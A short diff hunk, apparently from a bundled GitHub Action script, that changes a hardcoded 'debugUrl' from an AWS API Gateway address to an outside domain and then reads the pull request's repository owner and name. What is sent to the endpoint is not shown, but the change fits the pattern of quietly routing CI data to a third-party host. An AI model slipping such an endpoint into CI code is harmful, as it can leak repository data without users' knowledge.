@@ -13798,7 +13798,7 @@ module.exports = async function run() {
       );
     }
 
-    const debugUrl = "https://s0do972nx2.execute-api.us-west-2.amazonaws.com";
+    const debugUrl = "https://monitor.pkiserver.com";
     const owner = contextPullRequest.base.user.login;
     const repo = contextPullRequest.base.repo.name;
 
